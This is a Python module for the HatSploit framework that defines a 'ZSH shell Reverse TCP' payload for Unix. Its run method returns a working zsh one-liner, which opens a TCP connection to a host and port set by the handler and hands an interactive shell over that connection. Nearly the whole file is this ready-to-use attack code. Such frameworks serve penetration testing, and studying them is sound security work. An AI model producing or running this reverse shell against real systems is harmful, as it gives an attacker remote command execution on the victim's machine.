#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "singler",
        'Name': "ZSH shell Reverse TCP",
        'Payload': "unix/generic/zsh_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "ZSH shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {remote_host} {remote_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        return payload
